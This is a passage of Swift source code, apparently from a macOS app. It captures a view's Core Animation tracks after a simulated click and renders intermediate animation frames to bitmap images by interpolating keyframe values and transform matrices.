            view.mouseUp(with: click)
            var tracks: [(CALayer, CAAnimation)] = []
            func collect(_ l: CALayer) {
                for key in l.animationKeys() ?? [] {
                    if let a = l.animation(forKey: key) { tracks.append((l, a)) }
                    l.removeAnimation(forKey: key)
                }
                for s in l.sublayers ?? [] { collect(s) }
            }
            if let root = view.layer { collect(root) }
            out.append(Poke(view: view, tracks: tracks, length: tracks.map(\.1.duration).max() ?? 0))
        }
        return out
    }

    /// The view as it looks `t` seconds into this reaction, at 2x, padded by `pad`;
    /// nil once the reaction is over and the mark is back at rest.
    func frame(at t: TimeInterval) -> NSImage? {
        guard t < length, let root = view.layer else { return nil }
        CATransaction.begin()
        CATransaction.setDisableActions(true)
        // A transform track starts from rest, so a squish's last value does not
        // carry into the dizzy beat. Only those layers: the ring's flattening is a
        // transform the view set, not one it animates.
        for (layer, a) in tracks where (a as? CAPropertyAnimation)?.keyPath?.hasPrefix("transform") == true {
            layer.transform = CATransform3DIdentity
        }
        for (layer, a) in tracks {
            guard let path = (a as? CAPropertyAnimation)?.keyPath else { continue }
            let p = max(0, min(1, t / a.duration))
            if let k = a as? CAKeyframeAnimation, let values = k.values {
                let times = k.keyTimes?.map(\.doubleValue)
                    ?? values.indices.map { Double($0) / Double(max(1, values.count - 1)) }
                let i = max(0, (times.lastIndex { $0 <= p } ?? 0))
                let j = min(values.count - 1, i + 1)
                let u = times[j] > times[i] ? (p - times[i]) / (times[j] - times[i]) : 0
                layer.setValue(Self.mix(values[i], values[j], u), forKeyPath: path)
            } else if let b = a as? CABasicAnimation, let from = b.fromValue, let to = b.toValue {
                layer.setValue(Self.mix(from, to, p), forKeyPath: path)
            }
        }
        CATransaction.commit()

        let size = NSSize(width: view.bounds.width + Self.pad * 2, height: view.bounds.height + Self.pad * 2)
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(size.width * 2),
                                   pixelsHigh: Int(size.height * 2), bitsPerSample: 8, samplesPerPixel: 4,
                                   hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB,
                                   bytesPerRow: 0, bitsPerPixel: 0)!
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        let cg = NSGraphicsContext.current!.cgContext
        cg.scaleBy(x: 2, y: 2)
        cg.translateBy(x: Self.pad, y: Self.pad)
        // `render(in:)` draws CGImage contents but not the wrapper AppKit puts in a
        // layer for an NSImage, so the image layer holds the same picture as a
        // CGImage for the render and gets its own contents back after.
        let held = root.sublayers?.first { $0.contents != nil }
        let original = held?.contents
        held?.contents = view.image?.cgImage(forProposedRect: nil, context: nil, hints: nil)
        root.render(in: cg)
        held?.contents = original
        NSGraphicsContext.restoreGraphicsState()
        let img = NSImage(size: NSSize(width: size.width * 2, height: size.height * 2))
        img.addRepresentation(rep)
        return img
    }

    /// Linear between two keyframe values: numbers, or the squish's scale matrices.
    private static func mix(_ a: Any, _ b: Any, _ u: Double) -> Any {
        if let x = a as? NSNumber, let y = b as? NSNumber {
            return NSNumber(value: x.doubleValue + (y.doubleValue - x.doubleValue) * u)
        }
        if let x = (a as? NSValue)?.caTransform3DValue, let y = (b as? NSValue)?.caTransform3DValue {
            let m = CGFloat(u)
            var r = x
            r.m11 += (y.m11 - x.m11) * m; r.m22 += (y.m22 - x.m22) * m; r.m33 += (y.m33 - x.m33) * m
            r.m41 += (y.m41 - x.m41) * m; r.m42 += (y.m42 - x.m42) * m
            return NSValue(caTransform3D: r)
        }
        return u < 0.5 ? a : b
    }
}
